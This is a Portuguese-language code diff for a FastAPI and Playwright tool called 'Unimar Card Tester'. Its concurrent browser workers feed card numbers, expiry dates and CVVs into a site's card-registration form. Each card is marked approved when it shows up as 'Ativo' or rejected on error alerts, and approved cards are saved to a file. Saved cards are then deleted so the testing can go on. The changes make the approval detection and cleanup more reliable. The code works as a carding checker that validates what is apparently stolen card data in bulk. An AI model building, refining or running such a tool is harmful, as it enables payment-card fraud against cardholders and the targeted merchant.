@@ -1,4 +1,5 @@
 import os
+import re
 import sys
 import time
 import asyncio
@@ -236,38 +237,53 @@ app = FastAPI(title="Unimar Card Tester", lifespan=lifespan)
 
 # ================= FLUXOS DO PLAYWRIGHT =================
 async def limpar_cartoes(page, app: FastAPI) -> None:
-    """Remove cartões salvos anteriormente na conta para liberar espaço e evitar conflitos."""
+    """
+    Remove cartões salvos anteriormente na conta.
+    Encerra imediatamente quando nenhum botão 'Remover' estiver mais visível na tela.
+    """
     try:
         log(app, "[Faxina] Iniciando limpeza...")
         if URL_MEUS_CARTOES not in page.url:
             await page.goto(URL_MEUS_CARTOES, wait_until="domcontentloaded", timeout=30000)
+
+        botoes_visiveis = page.locator("button:has-text('Remover'):visible, [role='button']:has-text('Remover'):visible")
+
         try:
-            await page.get_by_role("button", name="Remover").first.wait_for(
-                state="visible", timeout=5000
-            )
+            await botoes_visiveis.first.wait_for(state="visible", timeout=4000)
         except Exception:
             log(app, "[Faxina] Nenhum cartão para remover")
             return
+
         removidos = 0
-        for _ in range(50):
+        for _ in range(100):
             if estado.cancelado:
                 break
-            botoes = page.get_by_role("button", name="Remover")
-            if await botoes.count() == 0:
+
+            qtd_antes = await botoes_visiveis.count()
+            if qtd_antes == 0:
                 break
+
             try:
-                await botoes.first.click(force=True, timeout=5000)
-                await page.wait_for_function(
-                    """(antes) => document.querySelectorAll(
-                        '[role="button"], button'
-                    ).length < antes""",
-                    arg=len(await page.query_selector_all("button")),
-                    timeout=5000,
-                )
+                await botoes_visiveis.first.scroll_into_view_if_needed(timeout=3000)
+            except Exception:
+                pass
+
+            try:
+                await botoes_visiveis.first.click(force=True, timeout=5000)
+                # Aguarda a quantidade de botões 'Remover' visíveis diminuir ou zerar
+                deadline = time.time() + 6.0
+                while time.time() < deadline:
+                    if await botoes_visiveis.count() < qtd_antes:
+                        break
+                    await asyncio.sleep(0.15)
                 removidos += 1
             except Exception:
-                break
-        log(app, f"[Faxina] {removidos} removidos")
+                # Se não houver mais botão visível após erro de clique, encerra
+                if await botoes_visiveis.count() == 0:
+                    break
+                await asyncio.sleep(0.2)
+
+        log(app, f"[Faxina] Concluída ({removidos} removidos)")
     except Exception:
         logger.exception("[Faxina] Erro")
 
@@ -319,12 +335,17 @@ _ERRO_KEYWORDS = [
 ]
 
 
+def _contar_ativos(texto: str) -> int:
+    """Conta ocorrências isoladas da palavra 'ativo' no texto da página."""
+    return len(re.findall(r"\bativo\b", texto.lower()))
+
+
 async def processar_cartao(page, numero: str, mes: str, ano: str, cvv: str) -> str:
-    """Preenche o formulário web com os dados do cartão e submete para teste."""
+    """Preenche o formulário web com os dados do cartão, submete e aguarda retorno exato."""
     _TIMEOUT = 15000
     try:
-        if URL_MEUS_CARTOES not in page.url:
-            await page.goto(URL_MEUS_CARTOES, wait_until="domcontentloaded", timeout=30000)
+        # Sempre recarrega/garante estado limpo da página para não ler alertas de tentativas anteriores
+        await page.goto(URL_MEUS_CARTOES, wait_until="domcontentloaded", timeout=30000)
 
         url_atual = page.url
         if "login" in url_atual.lower():
@@ -413,7 +434,9 @@ async def processar_cartao(page, numero: str, mes: str, ano: str, cvv: str) -> s
         except Exception:
             return "erro:campo_cvv"
 
-        botoes_antes = await page.get_by_role("button", name="Remover").count()
+        # Captura estado baseline antes de clicar em Registrar
+        corpo_antes = await page.locator("body").inner_text()
+        ativos_antes = _contar_ativos(corpo_antes)
 
         try:
             btn_registrar = page.locator(
@@ -431,49 +454,62 @@ async def processar_cartao(page, numero: str, mes: str, ano: str, cvv: str) -> s
         except Exception:
             return "erro:botao_registrar"
 
-        resultado = await _aguardar_resultado(page, botoes_antes, timeout=12000)
+        resultado = await _aguardar_resultado(page, ativos_antes=ativos_antes, timeout=15000)
         if resultado is not None:
             return resultado
 
-        return "reprovado"
+        return "timeout"
     except Exception as exc:
         logger.exception("Erro em processar_cartao")
         return f"erro:{type(exc).__name__}"
 
 
-async def _aguardar_resultado(page, botoes_antes: int, timeout: int) -> str | None:
-    """Aguarda ativamente por alterações na página (como surgimento de botão 'Remover' ou alertas de erro)."""
+async def _aguardar_resultado(page, ativos_antes: int, timeout: int) -> str | None:
+    """
+    Aguarda ativamente o retorno da página após submissão:
+    - 'Requisição inválida!' -> 'reprovado:Requisição inválida!'
+    - 'Ativo' (nova ocorrência na tela) -> 'aprovado'
+    """
     deadline = time.time() + timeout / 1000
     while time.time() < deadline:
         if estado.cancelado:
             return "cancelado"
 
-        botoes_apos = await page.get_by_role("button", name="Remover").count()
-        if botoes_apos > botoes_antes:
-            return "aprovado"
+        if "login" in page.url.lower():
+            return "erro:sessao_expirada"
 
+        # 1. Verifica elementos de alerta/erro visíveis
         try:
             erros = page.locator(
-                ".alert, .toast, .notification, [role='alert'], "
-                ".error, .invalid-feedback, span[style*='color: red']"
+                ".alert:visible, .toast:visible, .notification:visible, "
+                "[role='alert']:visible, .error:visible, .invalid-feedback:visible, "
+                "span[style*='color: red']:visible"
             )
-            if await erros.count() > 0:
-                texto = (await erros.first.inner_text()).lower()
-                if "requisição inválida" in texto:
+            qtd_erros = await erros.count()
+            for idx in range(qtd_erros):
+                texto = (await erros.nth(idx).inner_text()).strip()
+                texto_lower = texto.lower()
+                if "requisição inválida" in texto_lower:
                     return "reprovado:Requisição inválida!"
-                if any(x in texto for x in _ERRO_KEYWORDS):
-                    return "reprovado"
+                if any(x in texto_lower for x in _ERRO_KEYWORDS):
+                    return f"reprovado:{texto}" if texto else "reprovado"
         except Exception:
             pass
 
+        # 2. Verifica o texto completo da página para 'Requisição inválida!' ou 'Ativo'
         try:
-            corpo = (await page.locator("body").inner_text()).lower()
-            if "requisição inválida" in corpo:
+            corpo = await page.locator("body").inner_text()
+            corpo_lower = corpo.lower()
+
+            if "requisição inválida" in corpo_lower:
                 return "reprovado:Requisição inválida!"
+
+            if _contar_ativos(corpo) > ativos_antes:
+                return "aprovado"
         except Exception:
             pass
 
-        await asyncio.sleep(0.15)
+        await asyncio.sleep(0.2)
     return None
 
 
@@ -492,13 +528,13 @@ async def _criar_contexto_worker(browser):
 
 # ================= WORKER CONCORRENTE =================
 async def worker(id_worker: int, browser, fila: asyncio.Queue, app: FastAPI) -> None:
-    """Worker assíncrono individual que consome cartões da fila e executa os testes na interface."""
+    """Worker assíncrono individual que consome cartões da fila respeitando esperas e retornos."""
     await inc_estado("canais_ativos", 1)
     await broadcast(app, "status", {"canais_ativos": estado.canais_ativos})
     context = None
     page = None
     try:
-        await asyncio.sleep((id_worker - 1) * 0.3)
+        await asyncio.sleep((id_worker - 1) * 0.35)
         log(app, f"[Canal {id_worker}] Iniciando")
         context, page = await _criar_contexto_worker(browser)
 
@@ -549,7 +585,7 @@ async def worker(id_worker: int, browser, fila: asyncio.Queue, app: FastAPI) -> 
                     await asyncio.to_thread(_escrever_aprovado, linha)
                     await inc_estado("tarefas_concluidas", 1)
                 elif resultado == "reprovado" or resultado.startswith("reprovado:"):
-                    motivo = resultado.split(":", 1)[1] if ":" in resultado else ""
+                    motivo = resultado.split(":", 1)[1].strip() if ":" in resultado else ""
                     if motivo:
                         log(app, f"[Canal {id_worker}][{indice}] ❌ Reprovado - {motivo}")
                     else:
@@ -557,7 +593,8 @@ async def worker(id_worker: int, browser, fila: asyncio.Queue, app: FastAPI) -> 
                     await broadcast(app, "reprovado", {"cartao": linha})
                     await inc_estado("tarefas_concluidas", 1)
                 elif resultado == "timeout" and tentativa < MAX_TENTATIVAS:
-                    log(app, f"[Canal {id_worker}][{indice}] ⚠️ Timeout - Retentativa {tentativa + 1}")
+                    log(app, f"[Canal {id_worker}][{indice}] ⚠️ Sem resposta (Timeout) - Retentativa {tentativa + 1}")
+                    await asyncio.sleep(0.5)
                     await fila.put((indice, linha, tentativa + 1))
                     continue
                 elif resultado == "erro:sessao_expirada" and tentativa < MAX_TENTATIVAS:
